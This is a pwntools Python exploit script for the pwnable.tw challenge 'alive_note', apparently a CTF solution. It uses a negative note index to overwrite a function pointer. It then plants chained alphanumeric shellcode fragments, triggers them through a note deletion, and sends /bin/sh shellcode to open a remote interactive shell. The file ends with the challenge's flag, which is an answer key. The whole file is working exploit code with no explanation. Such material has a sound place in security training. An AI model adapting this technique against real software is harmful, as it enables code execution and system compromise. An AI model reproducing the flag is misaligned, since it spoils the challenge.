from pwn import *

elf = ELF("alive_note")
r = remote('chall.pwnable.tw', 10300)


def Sendraw(s):
    r.send_raw(s)


def Sendline(s):
    r.sendline(s)


def AddNote(index, name):
    Sendraw(b'1\x00')
    r.read()
    Sendraw(b'%d\x00' % index)
    r.read()
    Sendraw(name)
    r.readline()


def ShowNote(index):
    Sendraw('2\x00')
    r.read()
    Sendraw('%d\x00' % index)
    recv = r.readline()
    return recv


def DeleteNote(index):
    Sendraw(b'3\x00')
    r.read()
    Sendraw(b'%d\x00' % index)


shellcode1 = b'PYjzZSu8'
shellcode2 = b'4F0A5Su8'
shellcode3 = b'fuck'
shellcode4 = b'X4340t9'
shellcode5 = b'XH0AFu6'
shellcode6 = b'0A60AWua'
shellcode = asm(shellcraft.sh())

sleep(1)
with log.progress("sending shellcode") as l:
    r.read()
    l.status("shellcode 1")
    AddNote(-27, shellcode1)
    r.read()
    l.status("shellcode 2")
    AddNote(0, shellcode2)
    r.read()
    l.status("shellcode 3")
    AddNote(1, shellcode3)
    r.read()
    l.status("shellcode 4")
    AddNote(2, shellcode4)
    r.read()
    l.status("shellcode 5")
    AddNote(3, shellcode5)
    r.read()
    l.status("shellcode 6")
    AddNote(4, shellcode6)

    r.read()
    DeleteNote(-27)
    l.status("opening shell")
    r.send_raw(0x37 * b'A' + shellcode)
    l.success()
    r.interactive()

# FLAG --> FLAG{Sh3llcoding_in_th3_n0t3_ch4in}
